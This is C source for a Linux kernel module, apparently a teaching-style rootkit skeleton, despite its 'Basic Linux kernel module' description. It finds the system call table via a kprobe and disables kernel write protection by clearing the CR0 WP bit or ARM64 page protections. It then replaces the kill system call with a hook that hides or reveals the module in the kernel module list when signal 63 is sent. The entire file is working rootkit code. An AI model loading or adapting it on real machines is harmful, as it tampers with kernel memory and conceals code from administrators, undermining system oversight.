#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <asm/ptrace.h>
#include <linux/unistd.h>
#include <linux/list.h>

#if IS_ENABLED(CONFIG_X86_64)
#include <asm/paravirt.h>
#elif IS_ENABLED(CONFIG_ARM64)
#include <asm/pgtable.h>
#endif

/*
 * Informational macros about this module
 * (GPL license is necessary for full functionality)
 */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Chris Lattman");
MODULE_DESCRIPTION("Basic Linux kernel module");
MODULE_VERSION("0.1.0");

/* Pointer to the memory address of the system call table */
static unsigned long *__sys_call_table = NULL;

#if IS_ENABLED(CONFIG_ARM64)
/* Pointer to the system call table page table entry */
static pte_t *__sys_call_table_pte = NULL;
#endif

/*
 * kprobe struct to find kallsyms_lookup_name function
 * (since it's no longer exported)
 */
static struct kprobe kp_kallsyms_func = {
    .symbol_name = "kallsyms_lookup_name",
};

/* Function pointer to kallsyms_lookup_name */
typedef unsigned long (*kallsyms_lookup_name_p_t)(const char *name);
static kallsyms_lookup_name_p_t kallsyms_lookup_name_p = NULL;

/* Function signature for the `sys_kill` system call */
typedef asmlinkage long (*pt_regs_t)(const struct pt_regs *regs);

/*
 * Stores the function pointer to the original `sys_kill` system call, used when
 * restoring the system call table to its original state
 */
static pt_regs_t orig_kill = NULL;

/* Variables used when hiding or revealing the existence of this kernel module */
static struct list_head *module_previous;
static int module_hidden = 0;

#if IS_ENABLED(CONFIG_X86_64)
/*
 * Modifies the Intel/AMD CR0 register state. This function is necessary
 * because write_cr0 is no longer effective.
 *
 * @param val the value to write to the CR0 register
 */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

/* Unsets the write protection bit (bit 16) of the CR0 register */
static void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & ~0x00010000);
    pr_info("Unprotected memory\n");
}

/* Sets the write protection bit (bit 16) of the CR0 register */
static void protect_memory(void)
{
    write_cr0_forced(read_cr0() | 0x00010000);
    pr_info("Protected memory\n");
}
#elif IS_ENABLED(CONFIG_ARM64)
/* Unsets the PTE write protect bit */
static void unprotect_memory(void)
{
    *__sys_call_table_pte = pte_mkwrite(pte_mkdirty(*__sys_call_table_pte), NULL);
    *__sys_call_table_pte = clear_pte_bit(*__sys_call_table_pte, __pgprot((_AT(pteval_t, 1) << 7)));
    pr_info("Unprotected memory\n");
}

/* Sets the PTE write protect bit */
static void protect_memory(void)
{
    pte_wrprotect(*__sys_call_table_pte);
    pr_info("Protected memory\n");
}

/*
 * Obtains a PTE from virtual memory (for ARM processors).
 *
 * @param addr memory address
 * @return pointer to page table entry (PTE)
 */
static pte_t *page_from_virt(unsigned long addr) {
    pgd_t *pgd;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *ptep;

    struct mm_struct *init_mm_ptr = (struct mm_struct *)kallsyms_lookup_name_p("init_mm");
    if (!init_mm_ptr) {
        pr_info("kallsyms_lookup_name could not find symbol init_mm\n");
        return NULL;
    }

    pgd = pgd_offset(init_mm_ptr, addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) {
        return NULL;
    }

    pud = pud_offset((p4d_t *)pgd, addr);
    if (pud_none(*pud) || pud_bad(*pud)) {
        return NULL;
    }

    pmd = pmd_offset(pud, addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) {
        return NULL;
    }

    ptep = pte_offset_kernel(pmd, addr);
    if (!ptep) {
        return NULL;
    }

    return ptep;
}
#endif

/*
 * Wrapper function that is called whenever the `sys_kill` system call is executed.
 * Refer to https://syscalls64.paolostivanin.com/
 *
 * Note: the `kill` command must always be called with two arguments: the signal
 * number and the PID. This is due to them being required arguments in the
 * underlying system call. To test this hook, you can just use 1 as the PID (its
 * value is ignored so long as the signal is 63).
 *
 * @param regs pointer to a struct containing the register values (i.e. function
 * arguments)
 * @return original `sys_kill` return value, or 0
*/
static asmlinkage long kill_hook(const struct pt_regs *regs)
{
#if IS_ENABLED(CONFIG_X86_64)
    int sig = regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
    int sig = regs->regs[1];
#endif
    if (sig == 63) {
        if (!module_hidden) {
            module_previous = THIS_MODULE->list.prev;
            list_del(&THIS_MODULE->list);
            module_hidden = 1;
            pr_info("mymodule is now hidden!\n");
        } else {
            list_add(&THIS_MODULE->list, module_previous);
            module_hidden = 0;
            pr_info("mymodule is no longer hidden.\n");
        }
        return 0;
    }
    return orig_kill(regs);
}

/* Overwrites the system call table for the `sys_kill` system call. */
static void overwrite_sys_call_table(void)
{
    /* Unprotect memory before overwriting system call table */
    unprotect_memory();

    /*
     * Stores the function pointer to the original `sys_kill` system call and
     * overwrites the table entry with the address of our own kill_hook function
     */
    orig_kill = (pt_regs_t)__sys_call_table[__NR_kill];
    __sys_call_table[__NR_kill] = (unsigned long)&kill_hook;

    /* Protect memory to prevent further overwriting of the system call table */
    protect_memory();
}

/* Restores the system call table to its original state. */
static void restore_sys_call_table(void)
{
    /* Unprotect memory before overwriting system call table */
    unprotect_memory();

    /*
     * Restores the table entry for the `sys_kill` system call with the original
     * function pointer
     */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

    /* Protect memory once again */
    protect_memory();
}

/* Entry function */
static int __init module_start(void)
{
    int ret;

    /* Registers the kprobe in order to find the kallsyms_lookup_name function */
    ret = register_kprobe(&kp_kallsyms_func);
    if (ret < 0) {
        /* Shorthand for printk(KERN_INFO ...) */
        pr_info("register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    /* Retrieves the memory address of the system call table */
    kallsyms_lookup_name_p = (kallsyms_lookup_name_p_t)kp_kallsyms_func.addr;
    __sys_call_table = (unsigned long *)kallsyms_lookup_name_p("sys_call_table");
    if (!__sys_call_table) {
        pr_info("kallsyms_lookup_name could not find symbol sys_call_table");
        return 1;
    }

#if IS_ENABLED(CONFIG_ARM64)
    __sys_call_table_pte = page_from_virt((unsigned long)__sys_call_table);
    if (!__sys_call_table_pte) {
        pr_info("page_from_virt could not obtain system call table PTE\n");
        return 1;
    }
#endif

    overwrite_sys_call_table();

    pr_info("Module loaded!\n");
    return 0;
}

/* Exit function */
static void __exit module_end(void)
{
    restore_sys_call_table();

    /* Frees up any resources used when registering the kprobe */
    unregister_kprobe(&kp_kallsyms_func);

    pr_info("Module unloaded.\n");
}

/* Registers entry and exit functions */
module_init(module_start);
module_exit(module_end);
